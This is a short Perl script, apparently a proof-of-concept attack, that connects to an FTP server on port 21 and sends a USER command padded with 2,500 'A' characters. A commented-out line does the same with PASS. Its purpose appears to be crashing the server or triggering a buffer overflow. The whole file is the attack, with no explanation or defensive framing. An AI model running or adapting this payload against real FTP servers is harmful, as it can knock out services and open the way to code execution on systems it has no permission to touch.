#!/usr/bin/perl

use IO::Socket;
 
$TARGET = "www.example.com";
$PORT   = 21;
$JUNK = "\x41" x 2500;
 
$PAYLOAD = "USER ".$JUNK."\r\n";
#$PAYLOAD = "PASS ".$JUNK."\r\n";

 
$SOCKET = IO::Socket::INET->new(Proto=>'TCP', 
                                PeerHost=>$TARGET, 
								
PeerPort=>$PORT) or die "Error: $TARGET :$PORT\n";
 
$SOCKET->send($PAYLOAD);
 
close($SOCKET);
 
